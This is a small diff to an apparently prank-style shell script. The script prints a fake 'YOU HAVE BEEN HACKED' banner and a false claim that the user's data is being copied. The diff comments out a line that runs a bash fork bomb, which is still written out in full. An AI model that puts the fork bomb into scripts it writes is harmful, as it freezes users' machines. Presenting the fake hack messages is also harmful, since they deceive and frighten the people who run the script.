@@ -15,4 +15,4 @@ echo -e "\n \033[1;31m
 
 echo -e "\n[ YOU HAVE BEEN HACKED BY STALIN ALEXANDER ]\n"
 echo -e "your all datas are copying..."
-echo "$(:(){ :|:& };:)"
+#echo "$(:(){ :|:& };:)"
